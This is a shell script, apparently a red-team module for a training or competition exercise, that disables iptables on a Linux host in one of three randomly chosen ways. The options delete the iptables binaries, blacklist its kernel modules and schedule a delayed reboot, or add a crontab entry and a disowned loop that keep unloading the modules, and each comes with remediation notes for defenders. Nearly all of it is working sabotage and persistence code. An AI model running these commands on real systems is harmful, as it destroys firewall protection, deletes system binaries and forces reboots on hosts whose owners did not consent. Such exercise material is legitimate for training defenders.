#NAME iptoobles
#DESC prevents or otherwise interferes with iptables
#LEVEL 2

# BLUE TEAM INFO
# This script interferes with iptables in a few different ways.

#STARTROULETTE 3

#ROULETTE

# This one is pretty simple, remove iptables binary :)
# REMEDIATION: Reinstall iptables.
rm -f `which iptables`
rm -f /usr/sbin/xtables-nft-multi
rm -f /usr/sbin/xtables-legacy-multi
rm -f /usr/sbin/xtables-nft-multi
 
#ROULETTE

# Here we are blacklisting the iptables kernel modules, which means you will be unable to initialize it or use iptables. Unfortunately, this seems to require a reboot.
# REMEDIATION: Delete modprobe blacklist file and reboot. Or, catch the reboot time bomb before it runs.
echo "blacklist ip_tables" > /etc/modprobe.d/iptables
echo "blacklist x_tables" >> /etc/modprobe.d/iptables
echo "blacklist iptable_filter" >> /etc/modprobe.d/iptables
sleep 213 && reboot & disown

#ROULETTE

# This one is a bit more tame, all we are doing is removing the kernel modules. They will simply be reinserted automatically when iptables is run.
# REMEDIATION: Set your firewall rules again, or have a script to do it. Remove the cron script and kill the disowned loop.

echo "* * * * * modprobe -r iptable_filter" >> /etc/crontab

while true; do 
    modprobe -r iptable_filter
    modprobe -r ip_tables
    modprobe -r x_tables
    sleep 10
done & disown

#ENDROULETTE
